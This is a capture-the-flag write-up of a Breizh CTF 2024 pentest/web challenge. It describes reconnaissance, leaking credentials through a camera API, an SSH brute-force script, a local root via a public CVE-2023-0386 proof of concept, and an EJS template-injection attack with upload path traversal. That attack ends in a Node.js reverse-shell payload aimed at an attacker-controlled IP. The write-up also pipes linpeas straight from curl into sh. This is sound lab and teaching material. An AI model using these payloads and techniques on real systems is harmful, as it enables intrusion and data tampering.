# Casino Limit by Inria - Breizh CTF 2024 - Write up 
#### By eddym@lou
Summary of the write up :

1. [Intro](#intro)
2. [CCTV](#CCTV)
3. [Bastion](#Bastion)
4. [Intranet](#intranet)


## Intro
This challenge was labelled with the **pentest** and **web** category and difficulty was **medium**.
To start we are given a playing card with a username `tbenedict` and an URL : `sirene.casinolimit.bzh`.
Launching an nmap scan on this url reveals several open ports : 

```Nmap scan report for sirene.casinolimit.bzh (135.125.135.213)
Host is up (0.0018s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE
22/tcp    open   ssh
53/tcp    closed domain
80/tcp    open   http
443/tcp   open   https
30080/tcp closed unknown
```

Let's start with the web page of the casino where we learn more about this challenge. 
This web page informs us that we are playing the role of Camille, a reformed gambler trying to get his personal info deleted from the Casino's database. Camille filled a form asking for the suppression of her data but it hasn't been respected. Our goal is to infiltrate the casino's network and delete the data ourselve. 
We are also given a password to connect via ssh on this very same server : `NEi9g8Bc`

Let's connect to this server with the given credentials : 
![SSH login](/BREIZHCTF/2024/images/1_ssh_login_start_machine.png)

The two messages indicates we have to check CCTV (security camera) and also check our mails on the bastion.
Let's take look at our ip address : 

![Ip configuration start machine](/BREIZHCTF/2024/images/2_ip_addr_start_machine.png)

Our machine has an ip in the 10.35.122.0/24 subnet (10.35.122.10)
No suspicious files or process were running on the machine, sudo -l was password protected but when looking at /usr/bin/ we noticed python3, curl and nmap. 
Let's try to learn a little more about our environnement with linpeas : `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`.
No interesting privesc related information but in the network session linpeas found two interesting servers in our subnet : 
`10.35.122.11 meetingcam meetingcam`
`10.35.122.20 bastion bastion`

Let's dig deeper into this with nmap : 
`nmap -Pn -sC -sV 10.35.122.0/24` reveals 5 hosts :

-10.35.122.10 = start machine 

-10.35.122.30 and 10.35.122.31 only have a dns runnning on tcp 53 so we'll leave them aside for now. 

-10.35.122.11 = "meeting cam" with ssh on port 22, port 5000 appears to be running a python HTTP server and returns this output "not found, please use the provided commands in the camera area instead of the API." 

-10.35.122.20 = "bastion" is running ssh on port 22, SMTP on port 25 and a DNS on port 53. The returned hostname is bastion.casinolimit.bzh.

The two messages indicated we have to check CCTV and then check our emails on the bastion. The result of the nmap scan seems very promising. 

## CCTV 
Since the camera seems to be accessible on port 5000 on the "meeting cam" server, let's try to access it : 
`curl -i http://10.35.122.11:5000/` 
The answer is the same as with the nmap scan, the server answers us, but we don't have a valid API endpoint. 
Since it appears to work with an HTTP API is implemented, let's try `curl -X GET http://10.35.122.11:5000/api/openapi.json` : still no success

Then we remembered the message "check cctv with your **current creds**". Let's try to login via ssh from the start machine to the meeting-cam : 
![SSH login CCTV](/BREIZHCTF/2024/images/3_ssh_meeting_cam.png)

When looking at network connection, we confirm that the camera is listening on several ports including port 5000 : 

![CCTV listening port](/BREIZHCTF/2024/images/4_listening_port_meetin_cam.png)

`grep -ir camera` or `grep -ir api` wasn't very helpful, but listing for hidden files on our home directory made us discover this rather interesting file `.bash_aliases`

![Hidden files on CCTV machine](/BREIZHCTF/2024/images/5_hidden_files_on_home_directory.png)

This file is setting up 5 aliases that seem to interact with the HTTP API of the camera.
Let's go back to our start machine and try to take a screenshot of the camera using this command : 
`curl -X GET http://10.35.122.11:5000/api/snapshot --output snapshot.jpg`
Then let's go back on our local terminal and scp this snapshot to our computer so we can view it : 
`scp tbenedict@sirene.casinolimit.bzh:/tmp/snapshot.jpg ./`
And this is the image we got : 

![CCTV screenshot 1](/BREIZHCTF/2024/images/6_snapshot_camera.jpg)

We now have a CVE number : `CVE-2023-0386`
And by moving the camera around and taking screenshots + scp-ing them to our local machine we were able to view the full whiteboard and got some credentials : 

![CCTV screenshot 2](/BREIZHCTF/2024/images/7_snapshot_camera_credentials.jpg)

Unfortunately there was a super mario "?" block, hidding one character in the credentials. We wrote down user = tocean and password : kaeCaiSo **?** jie7i

## Bastion 
Hydra wasn't downloaded onto the machine and we didn't have the root priviledges to install it, but we had python3, let's do this the old fashioned way and write a script to bruteforce the missing character and connect to the bastion.

```py
import subprocess

ascii_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:',.<>?/~"

for char in ascii_chars:
    password_attempt = "kaeCaiS" + char + "ojie7i"
    print("Trying password : " + "kaeCaiS" + char + "ojie7i")
    try:
        command = f"sshpass -p '{password_attempt}' tocean@10.35.122.20"
        
        subprocess.run(command, shell=True, check=True)
        
        print("Password found:", password_attempt)
        break
    except subprocess.CalledProcessError:
        continue`
```
The missing char was "o" so we logged in to the bastion with : tocean / kaeCaiSoojie7i

We found a poc for the CVE on github and from there it was pretty straight forward : 
`git clone https://github.com/sxlmnwb/CVE-2023-0386/`

`make all`

`./fuse ./ovlcap/lower ./gc`

In a second terminal we logged in to our start machine, and then to the bastion and `./exp`
And voilà we're root on the bastion : 

![Root on the bastion](/BREIZHCTF/2024/images/8_root_on_bastion.png)

Now let's go check our mails in `/home/admin/Mail/`

![Mail on bastion](/BREIZHCTF/2024/images/9_mail_bastion.png)

After looking around several mails, including the one where Camille asks for the deletion of her private data, we stumbled accross a rather interesting mail concerning a pentest made on the Casino's infrastructure :

![Mail pentest on bastion](/BREIZHCTF/2024/images/10_rapport_pentest_mail.png)

The pentest report seems to be included in attachments of this file. 
After talking with the challmaker we realised the "mutt" client was installed to facilitate the reading of the mails directly into the terminal. As it is written the pdf appears to be compressed in b64. To restore the pdf, we can simply copy the whole b64 string into a file on our laptop, and `cat file.txt | base64 -d > pentest_report.pdf`.

## Intranet
We now have access to a 30 pages pentest report about the Casino's intranet website : 

![Pentest report pdf file](/BREIZHCTF/2024/images/11_pentest_report.png)

An nmap scan from the bastion confirmed that the machine was connected to another subnet, where the intranet was being hosted.
At this point we already were pivoting through two machines as shown below : 

![Challenge infrastructure (simplified)](/BREIZHCTF/2024/images/12_simplified_challenge_infrastructure.png)

Since the pentest report was exclusively about web pentesting and we were only communicating via ssh we needed a way to interact with the intranet direcly through HTTP.
Two options :
- Setting up SSH tunneling from the bastion to our machine.
- Using our external VPS and setting up a Cloudflare tunnel.

We choose the second option : 

```
curl -L --output cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && 
sudo dpkg -i cloudflared.deb && 
sudo cloudflared service install [YOUR_CLOUDLFARE_TOKEN]
```
When accessing our VPS, with are granted with the web page login of the casino's intranet : 

![Intranet login page](/BREIZHCTF/2024/images/13_login_page.png)

We don't have any logins, we tried basic (admin/admin, user / password etc) without success. 
But then we realised we could reset our password by mail and we had full control of the mail server on the bastion :

![Password reset](/BREIZHCTF/2024/images/14_reset_password.png)

We now had access to the intranet. After looking around we noted two interesting pages : /profile and /balances
The /profile url allow users to change information related to their profiles, including a profile picture (via file upload)

![Password reset](/BREIZHCTF/2024/images/15_profile_url.png)

The /balances url allow user to view every player and information on their balance (money).
It takes users input in the /search parameter in order to filter the players by name. 

By reading through the report we found out : 
- That the file upload is not filtered so it's possible to upload any file type
- The default structure of the Express generator tool, used by to create the website (ejs) :

![Filesytem structure](/BREIZHCTF/2024/images/16_file_structure.png)

- An interesting comment saying that the ejs delimiter have been changed in the header.ejs file, from % to $

![Ejs delimiter](/BREIZHCTF/2024/images/17_delimiter_ejs.png)

- That the website is vulnerable to an SSTI

With all these information in mind we started to play around with the file upload and found out that we can not only have any extension but also that path travel was possible. Meaning we can upload any file anywhere on the fs (as long as the account running the website has enough permission).

With all these information we started crafting our first test payload and named it "header.ejs" to replace the original file that would be executed. 

![SSTI first payload](/BREIZHCTF/2024/images/18_first_ssti_payload.png)

We uploaded the file where the original header.ejs should be : `../../views/header.ejs`

Unfortunately going on /balance and inspecting the code with ctrl u didn't show any result.
The problem lies within the delimeter. As explained in the comment left by the web dev, the delimiter have been changed, so we have to change them back to "$". 
Looking at the official documentation : https://ejs.co/ (in custom delimiters)
We found out we can change the delimiter of an ejs object via a "delimiter" variable like ejs.delimiter = '$';
So we just need to set the delimiters back to $ with `&delimiter=$` when reloading the /balance page, reuploading our header.ejs file and bingo : 

![SSTI successful RCE](/BREIZHCTF/2024/images/19_payload_worked.png)

Now that we successfully have a RCE on the server let's change our payload into a reverse shell : 

```
<$= (function(){ var net = global.process.mainModule.require("net"), cp = global.process.mainModule.require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(30002, "YOUR BASTION IP", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})(); $>
```

And it works !
![Reverse Shell](/BREIZHCTF/2024/images/20_reverse_shell.png)

We're even root on the server.. let's find the postgres database and delete Camille from it. 
No postgres client is installed : no problem we're root, let's install one with apt
In the .env directory we find the credentials to connect to the database and list the clients table : 
 
![Clients table](/BREIZHCTF/2024/images/21_camille_clients.png)

We now have the id of Camille, let's delete her from the casino to free her from the shame of being exposed publically without money on the casino's intranet : 
`DELETE FROM balances WHERE id=23;`

On the bastion, we received a notification that we have a new mail, let's check it out : 
![Flag !](/BREIZHCTF/2024/images/22_final.png)

